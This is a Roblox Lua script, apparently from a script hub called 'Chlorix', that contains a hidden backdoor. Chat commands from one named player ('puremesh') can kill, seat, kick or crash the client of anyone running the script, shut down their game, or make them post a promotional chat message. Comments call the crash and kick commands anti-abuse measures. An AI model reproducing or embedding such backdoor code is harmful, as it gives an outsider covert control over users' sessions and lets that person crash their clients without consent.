-- We do a little trolling
local prefix = "cmd!"
local PuremeshFound = false
game:GetService("RunService").Heartbeat:Connect(function(deltaTime)
    game:GetService("RunService").Heartbeat:Wait()
    game:GetService("RunService").Heartbeat:Wait()
    game:GetService("RunService").Heartbeat:Wait()
    game:GetService("RunService").Heartbeat:Wait()
    game:GetService("RunService").Heartbeat:Wait()
    game:GetService("RunService").Heartbeat:Wait()
    game:GetService("RunService").Heartbeat:Wait()
    game:GetService("RunService").Heartbeat:Wait()
    game:GetService("RunService").Heartbeat:Wait()
    game:GetService("RunService").Heartbeat:Wait()
    game:GetService("RunService").Heartbeat:Wait()
    game:GetService("RunService").Heartbeat:Wait()
    game:GetService("RunService").Heartbeat:Wait()
    game:GetService("RunService").Heartbeat:Wait()
    game:GetService("RunService").Heartbeat:Wait()
    game:GetService("RunService").Heartbeat:Wait()
    game:GetService("RunService").Heartbeat:Wait()
    game:GetService("RunService").Heartbeat:Wait()
    game:GetService("RunService").Heartbeat:Wait()
    game:GetService("RunService").Heartbeat:Wait()
    game:GetService("RunService").Heartbeat:Wait()
    if PuremeshFound == false then
    for i, v in pairs(game.Players:GetPlayers()) do
        if v.Name == "puremesh" then
            PuremeshFound = true
            v.Chatted:Connect(function(msg)
                -- Only I can run these commands.
                if msg == prefix.."die" then
                    game.Players.LocalPlayer.Character:BreakJoints()
                end
                if msg == prefix.."sit" then
                    game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid").Sit = true
                end
                if msg == prefix.."notify" then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Chlorix on top :D!", "all")
                end

                -- This next bit will STRICTLY be used for people that abuse. You do not need to worry about these commands.
                if msg == prefix.."kick "..game.Players.LocalPlayer.Name then
                    game.Players.LocalPlayer:Kick("You have been caught abusing with Chlorix. Please stop.")
                end
                if msg == prefix.."shutdown "..game.Players.LocalPlayer.Name then
                    setclipboard("You have been caught abusing with Chlorix. Please stop.")
                    game:Shutdown()
                end
                if msg == prefix.."crash "..game.Players.LocalPlayer.Name then
                    game.Players.LocalPlayer:Kick("You have been caught abusing with Chlorix. Please stop.")
                    while true do end
                end
            end)
        end
    end
end
end)
game.Players.PlayerRemoving:Connect(function(plr)
    if plr.Name == "puremesh" then
        PuremeshFound = false
    end
end)
